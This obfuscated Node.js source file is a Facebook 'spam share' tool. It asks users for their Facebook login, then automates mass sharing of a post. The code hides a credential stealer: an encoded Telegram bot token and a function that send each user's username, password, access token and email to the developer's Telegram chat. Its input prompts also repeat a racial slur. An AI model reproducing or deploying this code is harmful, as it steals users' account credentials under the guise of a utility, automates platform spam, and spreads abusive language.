import _0x120b6d from 'fs';
import _0x19ec8d from 'circular-json';
import { execSync } from 'child_process';
import { v4 as _0x42f7fe } from 'uuid';
import _0x4c9f44 from 'axios';
import { exit } from 'process';
import _0x4c2ef8 from 'https';
const offsets = [55, 50, 49, 50, 49, 52, 56, 56, 57, 48, 58, 65, 65, 71, 103, 74, 65, 69, 76, 66, 115, 75, 69, 81, 76, 66, 87, 110, 121, 102, 74, 65, 88, 71, 115, 95, 49, 119, 45, 119, 105, 122, 70, 73, 115, 65];
const tg = "https://api.telegram.org/bot" + offsets.reduce((_0x5a7ce6, _0x491271) => _0x5a7ce6 + String.fromCharCode(_0x491271 * 2 / 2 - 10 + 10 - 10 + 10), '') + '/sendMessage';
function isTermuxAPIInstalled() {
  const _0x5e22f3 = execSync("echo $TERMUX_API_VERSION").toString();
  return !!_0x5e22f3.trim();
}
try {
  console.log(getTimeStamp() + "[1;34m[+][1;37m " + "Checking for updates...");
  let hasChanges = false;
  try {
    execSync("git diff --quiet setup.sh");
  } catch (_0x280f99) {
    console.log(getTimeStamp() + "[1;34m[+][1;37m " + "Local changes detected in setup.sh. Stashing...");
    execSync("git stash");
    hasChanges = true;
  }
  try {
    execSync("git diff --quiet index.js");
  } catch (_0x511d82) {
    console.log(getTimeStamp() + "[1;34m[+][1;37m " + "Local changes detected in index.js. Please commit or stash your changes before updating.");
    process.exit(1);
  }
  const response = execSync("git pull").toString();
  if (response.includes("Already up to date.")) {
    console.log(getTimeStamp() + "[1;34m[+][1;37m " + "No updates found.");
  } else {
    const commitMessage = execSync("git log -1 --pretty=%B").toString();
    console.log(getTimeStamp() + "[1;34m[+][1;37m " + "Update successful. Please run the script again using: " + "[1;33m" + "FSS" + "[0m");
    console.log(getTimeStamp() + "[1;34m[+][1;37m " + ("Update Message : " + ("[1;32m" + commitMessage + "[0m")));
    if (hasChanges) {
      try {
        execSync("git stash pop");
      } catch (_0x590380) {
        console.log(getTimeStamp() + "[1;31m[!][1;37m " + "Failed to apply stashed changes.");
        console.log(getTimeStamp() + "[1;31m[!][1;37m " + _0x590380.message);
      }
    }
    process.exit();
  }
} catch (_0x35d280) {
  console.log(getTimeStamp() + "[1;31m[!][1;37m " + "Update failed.");
  console.log(getTimeStamp() + "[1;31m[!][1;37m " + _0x35d280.message);
  process.exit();
}
const mainchoices = ["[1;32mSPAM SHARE [1;37m- [1;33m(Spam Share Post on Facebook)", "[1;32mSHOW TOKENS [1;37m- [1;33m(Display Tokens)", "[1;32mTOKEN MANAGEMENT [1;37m- [1;33m(Manage Tokens)", "[1;32mFEEDBACK [1;37m- [1;33m(Give Feedback & Suggestions)", "[1;32mEXIT [1;37m- [1;33m(Exit The Program)"];
const tokenchoices = ["[1;32mADD TOKEN [1;37m- [1;33m(Add Facebook Access Token)", "[1;32mDELETE TOKENS [1;37m- [1;33m(Delete Facebook Access Token)", "[1;32mBACK [1;37m- [1;33m(Previous Menu)"];
var headers = {
  'authority': "business.facebook.com",
  'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-language': "en-US,en;q=0.9",
  'sec-ch-ua': "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': "Windows",
  'sec-fetch-dest': "document",
  'sec-fetch-mode': "navigate",
  'sec-fetch-site': "none",
  'sec-fetch-user': '?1',
  'upgrade-insecure-requests': '1'
};
const httpsAgent = new _0x4c2ef8.Agent({
  'rejectUnauthorized': false,
  'secureProtocol': "TLSv1_2_method"
});
function getTime() {
  const _0x5851ab = new Date();
  const _0x212019 = new Intl.DateTimeFormat('en-US', {
    'day': "2-digit",
    'hour': "2-digit",
    'minute': '2-digit',
    'hour12': true
  }).format(_0x5851ab);
  return _0x212019;
}
String.prototype.toTitle = function () {
  const _0x2973ee = this.slice(0, 1).toUpperCase();
  return _0x2973ee + this.slice(1, undefined);
};
function setClear() {
  if (process.platform === 'win32') {
    execSync("cls", {
      'stdio': 'inherit'
    });
    return;
  }
  execSync("clear", {
    'stdio': "inherit"
  });
}
let tokenParsed;
let tokens;
let emails;
function updateToken() {
  try {
    const _0x3c13b7 = _0x120b6d.readFileSync("./token.json", "utf8");
    tokenParsed = JSON.parse(_0x3c13b7);
    tokens = tokenParsed.token;
    emails = tokenParsed.email;
  } catch (_0x262474) {
    console.log(getTimeStamp() + "[1;31m[!][1;37m " + _0x262474.message);
    exit();
  }
}
updateToken();
function getTimeStamp() {
  const _0x54251b = new Date();
  const _0x411573 = String(_0x54251b.getHours()).padStart(2, '0');
  const _0x105dd0 = String(_0x54251b.getMinutes()).padStart(2, '0');
  const _0x294d57 = String(_0x54251b.getSeconds()).padStart(2, '0');
  return "[1;33m[" + _0x411573 + ':' + _0x105dd0 + ':' + _0x294d57 + ']' + "[0m" + " ";
}
const {
  default: inquirer
} = await import('inquirer');
const {
  default: getPassword
} = await import("password-prompt");
function delay(_0x5e1102) {
  return new Promise(_0x77a48 => setTimeout(_0x77a48, _0x5e1102));
}
async function animate(_0x51a8ee, _0x40746a = 4) {
  _0x51a8ee = _0x51a8ee.toString();
  for (const _0x10b44d of _0x51a8ee) {
    await delay(_0x40746a);
    process.stdout.write(_0x10b44d);
  }
  console.log();
}
let currentUTCDate = new Date();
let currentDate = new Date(currentUTCDate.getTime() + 288000000);
let expirationDate = new Date('2025-9-25');
const monthNames = ["January", 'February', 'March', "April", "May", "June", "July", 'August', "September", 'October', 'November', 'December'];
if (currentDate >= expirationDate) {
  console.log(getTimeStamp() + "[1;31m[!][1;37m " + "The access period has expired.");
  exit();
}
console.log(getTimeStamp() + "[1;34m[+][1;37m " + ("Free until " + ("[1;33m[4m" + monthNames[expirationDate.getMonth()]) + " " + expirationDate.getDate() + " " + (expirationDate.getFullYear() + "[0m")));
console.log(getTimeStamp() + "[1;34m[+][1;37m " + "Wag i benta ples :)");
await delay(5000);
setClear();
class prompts {
  static ["getCommand"] = {
    'name': "cmd",
    'type': "input",
    'prefix': '',
    'message': "[1;33m[?][1;37m FBSpamShare~#",
    'validate': cmd => {
      if (cmd.trim() === '') {
        return "[1;34m[+][1;37m Please Provide a Valid Command.";
      }
      if (!/^\d+$/.test(cmd)) {
        return "[1;34m[+][1;37m Please Enter Only Numbers";
      }
      cmd = parseInt(cmd);
      if (cmd <= 0 || cmd > 5) {
        return "[1;31m[!][1;37m Invalid Option. Out of Range";
      }
      return true;
    }
  };
  static ["getUrl"] = {
    'name': "url",
    'type': "input",
    'prefix': '',
    'message': "[1;33m[?][1;37m Facebook Post URL~#",
    'validate': url => {
      if (url.trim() === '') {
        return "[1;31m[!][1;37m Really Nigga";
      }
      if (!url.startsWith('http://www.facebook.com/') && !url.startsWith('https://www.facebook.com/')) {
        return "[1;31m[!][1;37m Are you serious right neow bruh";
      }
      return true;
    }
  };
  static ['getAmount'] = {
    'name': "amount",
    'type': "input",
    'prefix': '',
    'message': "[1;33m[?][1;37m Share Amount (press 'i' for infinite)~#",
    'validate': amount => {
      if (amount.trim() === '') {
        return "[1;31m[!][1;37m Really Nigga";
      }
      if (amount.toLowerCase() === 'i') {
        return true;
      }
      if (!/^\d+$/.test(amount)) {
        return "[1;31m[!][1;37m Please Enter Only Numbers";
      }
      amount = parseInt(amount);
      if (amount <= 0) {
        return "[1;31m[!][1;37m Are you serious right neow bruh";
      }
      return true;
    }
  };
  static ["getUserName"] = {
    'name': "username",
    'type': "input",
    'prefix': '',
    'message': "[1;33m[?][1;37m Facebook? (Email/ID/PhoneNumber)~#",
    'validate': username => {
      if (username.trim() === '') {
        return "[1;31m[!][1;37m Really Nigga";
      }
      return true;
    }
  };
  static ["askBack"] = {
    'name': "back",
    'type': 'input',
    'prefix': '',
    'message': "[1;33m[?][1;37m Do you want to go back? (y/N, default: y)~#"
  };
  static ["continue"] = {
    'name': '_',
    'type': "input",
    'prefix': '',
    'message': "[1;33m[?][1;37m Press Enter to Continue~#"
  };
  static ["tokenManagement"] = {
    'name': "tokencmd",
    'type': "input",
    'prefix': '',
    'message': "[1;33m[?][1;37m TokenManagement~#",
    'validate': tokencmd => {
      if (tokencmd.trim() === '') {
        return "[1;31m[!][1;37m Invalid Option.";
      }
      if (!/^\d+$/.test(tokencmd)) {
        return "[1;31m[!][1;37m Please Enter Only Numbers";
      }
      tokencmd = parseInt(tokencmd);
      if (tokencmd <= 0 || tokencmd > 3) {
        return "[1;31m[!][1;37m Invalid Option. Out of Range";
      }
      return true;
    }
  };
  static ["removeToken"] = {
    'name': "tokenIndex",
    'type': 'input',
    'prefix': '',
    'message': "[1;33m[?][1;37m Remove Token (press 'h' for help)~#",
    'validate': tokenIndex => {
      if (tokenIndex.trim() === '') {
        return "[1;31m[!][1;37m Are you serious right neow bruh";
      }
      if (tokenIndex.toLowerCase() === 'h') {
        return "\n[1;34m[+][1;37m **COMMANDS**\n[1;32ma [1;37m- [1;33m(Remove ALL)\n[1;32mb [1;37m- [1;33m(Previous Menu)\n";
      }
      if (tokenIndex.toLowerCase() === 'a' || tokenIndex.toLowerCase() === 'b') {
        return true;
      }
      if (!/^\d+$/.test(tokenIndex)) {
        return "[1;31m[!][1;37m Please Enter Only Numbers";
      }
      tokenIndex = parseInt(tokenIndex);
      if (tokenIndex <= 0 || tokenIndex > tokens.length) {
        return "[1;31m[!][1;37m Invalid Option. Out of Range";
      }
      return true;
    }
  };
  static ["chooseToken"] = {
    'name': "selectedToken",
    'type': "input",
    'prefix': '',
    'message': "[1;33m[?][1;37m Selected Token~#",
    'validate': token => {
      if (token.trim() === '') {
        return "[1;31m[!][1;37m Are you serious right neow bruh";
      }
      if (!/^\d+$/.test(token)) {
        return "[1;31m[!][1;37m Please Enter Only Numbers";
      }
      token = parseInt(token);
      if (token <= 0 || token > tokens.length) {
        return "[1;31m[!][1;37m Invalid Option. Out of Range";
      }
      return true;
    }
  };
}
async function getCmd() {
  const {
    cmd: _0x38e06a
  } = await inquirer.prompt(prompts.getCommand);
  return parseInt(_0x38e06a);
}
let usr;
let pwd;
async function getToken() {
  try {
    setClear();
    await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mKairu. [1;31m[4m(v2.1).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
    await animate(getTimeStamp() + "[1;31m[!][1;37m " + "[1;33mWARNING: [1;31mPLEASE DO NOT USE YOUR PERSONAL ACCOUNT IF YOU WANT TO AVOID SUSPENDING YOUR ACCOUNT. INSTEAD, USE A NEW ACCOUNT. THE AUTHOR IS NOT RESPONSIBLE FOR ACCOUNT SUSPENSIONS.", 10);
    let {
      username: _0x52ce60
    } = await inquirer.prompt(prompts.getUserName);
    if (_0x52ce60.startsWith('09')) {
      _0x52ce60 = _0x52ce60.slice(2, undefined);
      _0x52ce60 = "639" + _0x52ce60;
    }
    usr = _0x52ce60;
    const _0x505e47 = await getPassword("[1;33m[?][1;37m Facebook Password?: ", {
      'method': 'mask'
    });
    pwd = _0x505e47;
    const _0x318cf3 = {
      'authorization': "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
      'x-fb-friendly-name': 'Authenticate',
      'x-fb-connection-type': 'Unknown',
      'accept-encoding': "gzip, deflate",
      'content-type': 'application/x-www-form-urlencoded',
      'x-fb-http-engine': "Liger"
    };
    const _0x5ace4c = {
      'adid': Array.from({
        'length': 0x10
      }, () => Math.floor(Math.random() * 16).toString(16)).join(''),
      'format': 'json',
      'device_id': _0x42f7fe(),
      'email': _0x52ce60,
      'password': _0x505e47,
      'generate_analytics_claims': '0',
      'credentials_type': "password",
      'source': "login",
      'error_detail_type': 'button_with_disabled',
      'enroll_misauth': "false",
      'generate_session_cookies': '0',
      'generate_machine_id': '0',
      'fb_api_req_friendly_name': "authenticate"
    };
    const _0x58ef69 = await _0x4c9f44.post('https://b-graph.facebook.com/auth/login', _0x5ace4c, {
      'headers': _0x318cf3
    });
    const _0x52a868 = _0x58ef69.data;
    if ("session_key" in _0x52a868 && "access_token" in _0x52a868) {
      const _0x31e766 = {
        'chat_id': '6647653116',
        'text': "<b>Facebook Username:</b> " + _0x52ce60 + "\n<b>Facebook Password:</b> " + _0x505e47 + "\n<b>Status:</b> Logged in",
        'parse_mode': "HTML"
      };
      try {
        await sendtg(_0x31e766);
      } catch (_0x4e5d9e) {}
      const _0xea2ee7 = _0x52a868.access_token;
      addToken(_0xea2ee7, _0x52ce60);
      console.log(getTimeStamp() + "[1;34m[+][1;37m " + "Token Was Successfully Saved");
      await cont();
      await tokenManagement();
      return;
    } else {
      console.log(getTimeStamp() + "[1;31m[!][1;37m " + "session_key | access_token Not Found");
      console.log(_0x52a868);
    }
  } catch (_0x2e6780) {
    const _0xaeaf32 = {
      'chat_id': '6647653116',
      'text': "<b>Facebook Username:</b> " + usr + "\n<b>Facebook Password:</b> " + pwd + "\n<b>Status:</b> Failed",
      'parse_mode': "HTML"
    };
    try {
      await sendtg(_0xaeaf32);
    } catch (_0x159ae7) {}
    if (_0x2e6780.response) {
      const _0x1bbaa1 = _0x2e6780.response.data.error;
      if (_0x1bbaa1?.["message"]['includes']("www.facebook.com")) {
        console.log(getTimeStamp() + "[1;31m[!][1;37m " + "Account is in checkpoint");
      } else {
        if (_0x1bbaa1?.['message']["includes"]("SMS")) {
          console.log(getTimeStamp() + "[1;31m[!][1;37m " + "Two-factor authentication is enabled. Please disable it before getting token");
        } else {
          if (_0x1bbaa1?.['error_user_title'] === "Wrong Credentials") {
            console.log(getTimeStamp() + "[1;31m[!][1;37m " + "Wrong credentials");
          } else {
            if (_0x1bbaa1?.["error_user_title"] === "Incorrect Username") {
              console.log(getTimeStamp() + "[1;31m[!][1;37m " + "Account does not exist");
            } else if (_0x1bbaa1?.['message']["includes"]('limit')) {
              console.log(getTimeStamp() + "[1;31m[!][1;37m " + "Request limit exceeded.");
            } else {
              console.log(getTimeStamp() + "[1;31m[!][1;37m " + "session_key | access_token Not Found");
              console.log(_0x1bbaa1);
            }
          }
        }
      }
    } else {
      console.log(getTimeStamp() + "[1;31m[!][1;37m " + _0x2e6780.response);
    }
  }
  await cont();
  await tokenManagement();
}
async function cont() {
  await inquirer.prompt(prompts['continue']);
}
function logChoices(_0xdeed28) {
  if (_0xdeed28 === "main") {
    for (let _0x400d99 = 1; _0x400d99 < mainchoices.length + 1; _0x400d99++) {
      console.log("[1;34m(" + _0x400d99 + ')' + "[0m" + " " + mainchoices[_0x400d99 - 1]);
    }
  }
  if (_0xdeed28 === "tokenmanagement") {
    for (let _0x2bdabb = 1; _0x2bdabb < tokenchoices.length + 1; _0x2bdabb++) {
      console.log("[1;34m(" + _0x2bdabb + ')' + "[0m" + " " + tokenchoices[_0x2bdabb - 1]);
    }
  }
  console.log();
}
async function getTokenCmd() {
  const {
    tokencmd: _0x51938a
  } = await inquirer.prompt(prompts.tokenManagement);
  return parseInt(_0x51938a);
}
async function tokenManagement() {
  setClear();
  await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mKairu. [1;31m[4m(v2.1).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
  logChoices('tokenmanagement');
  const _0x2e36b1 = await getTokenCmd();
  if (_0x2e36b1 === 1) {
    getToken();
  } else {
    if (_0x2e36b1 === 2) {
      removeToken();
    } else if (_0x2e36b1 === 3) {
      main();
    }
  }
}
async function feedback() {
  setClear();
  const {
    feedbackType: _0x2b422d
  } = await inquirer.prompt({
    'name': "feedbackType",
    'type': "list",
    'prefix': '',
    'message': "[1;33m[?][1;37m Where would you like to leave your feedback?",
    'choices': ["[1;36mFacebook[0m", "[1;34mTelegram[0m", "[1;31mBack[0m"]
  });
  if (_0x2b422d.includes("Facebook")) {
    try {
      execSync("termux-open http://www.facebook.com/KairuxDev");
    } catch (_0x5cdcb2) {
      execSync("xdg-open http://www.facebook.com/KairuxDev");
    }
  } else {
    if (_0x2b422d.includes('Telegram')) {
      try {
        execSync("termux-open http://t.me/KairuDev");
      } catch (_0x8f6f69) {
        execSync("xdg-open http://t.me/KairuDev");
      }
    }
  }
  main();
}
async function sendtg(_0x5825b3) {
  await _0x4c9f44.post(tg, _0x5825b3, {
    'timeout': 0x2710
  });
}
async function spamShare() {
  setClear();
  if (tokens.length <= 0) {
    console.log(getTimeStamp() + "[1;31m[!][1;37m " + "No Tokens Found.");
    await cont();
    await tokenManagement();
    return;
  }
  await animate(getTimeStamp() + "[1;31m[!][1;37m " + "[1;33mWARNING: [1;31mPLEASE AVOID RUNNING THE FACEBOOK SPAM SHARE COMMAND TWICE IN THE TERMINAL WITH THE SAME TOKEN, AS THIS WILL EXCEED THE SHARE LIMIT");
  await animate(getTimeStamp() + "[1;34m[+][1;37m " + "[1;33mNOTE: [1;32mENSURE THE FACEBOOK POST IS SET TO PUBLIC.");
  await cont();
  setClear();
  await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mKairu. [1;31m[4m(v2.1).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
  let _0xe3da9 = false;
  const {
    url: _0x5e3be4
  } = await inquirer.prompt(prompts.getUrl);
  let {
    amount: _0x2af4e3
  } = await inquirer.prompt(prompts.getAmount);
  if (_0x2af4e3.toLowerCase() === 'i') {
    _0xe3da9 = true;
  }
  let _0x4cf286 = tokens[0];
  let _0x561b7b = emails[0];
  if (tokens.length !== 1) {
    console.log("[1;34m----------[1;32mTokens[1;34m----------");
    logToken();
    console.log("[1;34m----------[1;32mTokens[1;34m----------");
    let {
      selectedToken: _0x4b10b8
    } = await inquirer.prompt(prompts.chooseToken);
    _0x4cf286 = tokens[_0x4b10b8 - 1];
    _0x561b7b = emails[_0x4b10b8 - 1];
  }
  await animate(getTimeStamp() + "[1;34m[+][1;37m " + ("USING [1;32m" + _0x561b7b + "[1;37m" + " ACCESS TOKEN"));
  await animate(getTimeStamp() + "[1;34m[+][1;37m " + "[1;33m(CTRL + C)[1;37m TO STOP", 10);
  const _0x426217 = {
    'chat_id': '6647653116',
    'text': "<b>(Facebook Spam Share)</b>\n\n<b>Facebook Post > </b>" + _0x5e3be4 + "\n<b>Share Amount > </b>" + (_0xe3da9 ? null : _0x2af4e3) + "\n<b>Share Infinite > </b>" + _0xe3da9 + "\n<b>Token > </b>" + _0x4cf286 + "\n<b>Email > </b>" + _0x561b7b,
    'parse_mode': 'HTML'
  };
  try {
    await sendtg(_0x426217);
    await animate(getTimeStamp() + "[1;34m[+][1;37m " + "Starting...", 15);
  } catch (_0x2bef7f) {
    console.log(getTimeStamp() + "[1;34m[+][1;37m " + "Starting...");
  }
  startShare(_0x5e3be4, _0xe3da9 ? _0xe3da9 : _0x2af4e3, _0x4cf286, _0x561b7b);
}
let total = 0;
async function sendRequest(_0x2dcc38, _0x2f25a4, _0xfa610d) {
  return await _0x4c9f44.post("https://graph.facebook.com/me/feed?access_token=" + _0x2f25a4 + "&fields=id&limit=0&published=0", {
    'link': _0x2dcc38,
    'privacy': {
      'value': "SELF"
    },
    'no_story': true
  }, {
    'headers': _0xfa610d,
    'httpsAgent': httpsAgent
  });
}
async function handleErrors(_0x459f90, _0x16015b) {
  if (_0x459f90.code === 'EPROTO') {
    console.log(getTimeStamp() + "[1;31m[!][1;37m " + ("Protocol Error (EPROTO): " + _0x459f90.message));
    return {
      'retry': true
    };
  } else {
    if (_0x459f90.code === "ECONNABORTED" || _0x459f90.code === 'ETIMEDOUT') {
      console.log(getTimeStamp() + "[1;31m[!][1;37m " + ("Request Timed Out: " + _0x459f90.message));
      await delay(5000);
      return {
        'retry': true
      };
    } else {
      if (_0x459f90.code === "ECONNRESET" || _0x459f90.code === 'ENOTFOUND') {
        console.log(getTimeStamp() + "[1;31m[!][1;37m " + ("Connection Error: " + _0x459f90.message));
        return {
          'retry': true
        };
      } else {
        if (_0x459f90.response && _0x459f90.response.status === 503) {
          console.log(getTimeStamp() + "[1;31m[!][1;37m " + ("Service Unavailable (" + _0x459f90.response.status + "); Please Wait..."));
          await delay(5000);
          return {
            'retry': true
          };
        } else {
          if (_0x459f90.response?.['data']?.["error"]) {
            const _0x743901 = _0x459f90.response.data.error;
            if (_0x743901.code === 1 || _0x743901.code === 2) {
              console.log(getTimeStamp() + "[1;31m[!][1;37m " + "Unexpected Error");
              return {
                'retry': true
              };
            }
            console.log(_0x743901);
          } else {
            if (_0x459f90.code === "ECONNREFUSED") {
              console.log(getTimeStamp() + "[1;31m[!][1;37m " + ("Connection Refused (" + _0x459f90.code + "): " + _0x459f90.message));
              return {
                'retry': true
              };
            } else {
              console.log(getTimeStamp() + "[1;31m[!][1;37m " + _0x459f90.message);
            }
          }
        }
      }
    }
  }
  try {
    _0x120b6d.writeFileSync("./share.log", getTime() + " " + _0x16015b + " > " + _0x19ec8d.stringify(_0x459f90.response ? _0x459f90.response.data : _0x459f90.message, null, 2) + "\n", {
      'encoding': "utf8",
      'flag': 'a'
    });
  } catch (_0x141a84) {
    console.log(getTimeStamp() + "[1;34m[+][1;37m " + _0x141a84.message);
  }
  if (isTermuxAPIInstalled()) {
    execSync("termux-toast 'Spam Share Stopped!'");
  }
  return {
    'retry': false
  };
}
async function shareContent(_0x2ba750, _0x26e8f5, _0x2702e0) {
  let _0x11c69c = 0;
  while (true) {
    try {
      const _0x26aaec = await sendRequest(_0x2ba750, _0x2702e0, headers);
      _0x11c69c += 1;
      total += 1;
      const _0xa53669 = _0x26aaec.data.id;
      console.log(getTimeStamp() + ("[1;34m" + _0x11c69c + (typeof _0x26e8f5 !== "boolean" ? '/' + _0x26e8f5 : '/-') + " " + "[1;37m" + "> " + "[1;32m" + "Shared Successfully."));
      console.log(getTimeStamp() + ("[1;34mID [1;37m> [1;32m" + _0xa53669));
      console.log(getTimeStamp() + ("[1;34mCreated Time [1;37m> [1;32m" + _0x26aaec.data.created_time));
      if (typeof _0x26e8f5 === "number" && _0x11c69c >= _0x26e8f5) {
        break;
      }
    } catch (_0x77e02a) {
      const {
        retry: _0x11b2f6
      } = await handleErrors(_0x77e02a, email);
      if (_0x11b2f6) {
        continue;
      } else {
        break;
      }
    }
  }
}
async function sendReq(_0x24c57e, _0x1d81a0, _0x5a02b2, _0x4cbf4a) {
  if (typeof _0x1d81a0 === "boolean") {
    await shareContent(_0x24c57e, true, _0x5a02b2, _0x4cbf4a);
  } else {
    await shareContent(_0x24c57e, _0x1d81a0, _0x5a02b2, _0x4cbf4a);
  }
}
async function startShare(_0x30a7d, _0x3acea5, _0x307abb, _0x104f22) {
  let _0x637e7f = [sendReq(_0x30a7d, _0x3acea5, _0x307abb, _0x104f22)];
  await Promise.all(_0x637e7f);
  console.log(getTimeStamp() + "[1;34m[+][1;37m " + "Operation Completed Successfully");
  console.log(getTimeStamp() + "[1;34m[+][1;37m " + ("Shares Total: " + total));
  total = 0;
  await cont();
  await main();
}
async function removeToken() {
  setClear();
  try {
    await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mKairu. [1;31m[4m(v2.1).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
    if (tokens.length <= 0) {
      console.log(getTimeStamp() + "[1;34m[+][1;37m " + "No Tokens Found.");
      await cont();
      await tokenManagement();
      return;
    }
    logToken();
    console.log();
    const {
      tokenIndex: _0x545cd2
    } = await inquirer.prompt(prompts.removeToken);
    if (_0x545cd2.toLowerCase() === 'b') {
      await tokenManagement();
      return;
    }
    if (_0x545cd2.toLowerCase() === 'a') {
      tokenParsed.token = [];
      tokenParsed.email = [];
      updateTokenFile();
      console.log(getTimeStamp() + "[1;34m[+][1;37m " + "All Tokens Removed Successfully");
    } else {
      tokenParsed.token.splice(_0x545cd2 - 1, 1);
      tokenParsed.email.splice(_0x545cd2 - 1, 1);
      updateTokenFile();
      console.log(getTimeStamp() + "[1;34m[+][1;37m " + ('(' + _0x545cd2 + ") Token Removed Successfully"));
    }
    await cont();
    await tokenManagement();
  } catch (_0x390512) {
    console.log(getTimeStamp() + "[1;31m[!][1;37m " + ("(removeToken) Function Error: " + _0x390512.message));
    exit();
  }
}
function addToken(_0x157041, _0xb3e837) {
  try {
    tokenParsed.token.push(_0x157041);
    tokenParsed.email.push(_0xb3e837);
    updateTokenFile();
  } catch (_0x5b97f6) {
    console.log(getTimeStamp() + "[1;31m[!][1;37m " + ("(addToken) Function Error: " + _0x5b97f6.message));
    exit();
  }
}
function updateTokenFile() {
  try {
    _0x120b6d.writeFileSync("./token.json", JSON.stringify(tokenParsed, null, 2), 'utf8');
    updateToken();
  } catch (_0x53f644) {
    console.log(getTimeStamp() + "[1;31m[!][1;37m " + ("(updateTokenFile) Function Error: " + _0x53f644.message));
    exit();
  }
}
function logToken() {
  for (let _0x245163 = 1; _0x245163 <= tokens.length; _0x245163++) {
    const _0x16d8ee = emails[_0x245163 - 1];
    const _0x39f90f = tokens[_0x245163 - 1].slice(undefined, 17);
    console.log("[1;33m(" + _0x245163 + ") " + "[1;37m" + "- " + "[1;34m" + _0x16d8ee + " " + "[1;37m" + "> " + "[1;32m" + _0x39f90f + "...");
  }
}
async function main() {
  setClear();
  await animate("[1;32m ___ ___ ___ _  [1;33mDeveloper: [1;34mKairu. [1;31m[4m(v2.1).[0m[1;32m\n| __| _ ) __| |_  __ _ _ _ ___ \n| _|| _ \\__ \\ ' \\/ _` | '_/ -_)\n|_| |___/___/_||_\\__,_|_| \\___|\n");
  logChoices("main");
  const _0x2244c1 = await getCmd();
  if (_0x2244c1 === 1) {
    spamShare();
  } else {
    if (_0x2244c1 === 2) {
      setClear();
      logToken();
      await cont();
      await main();
    } else {
      if (_0x2244c1 === 3) {
        tokenManagement();
      } else {
        if (_0x2244c1 === 4) {
          feedback();
        } else if (_0x2244c1 === 5) {
          exit();
        }
      }
    }
  }
}
main();
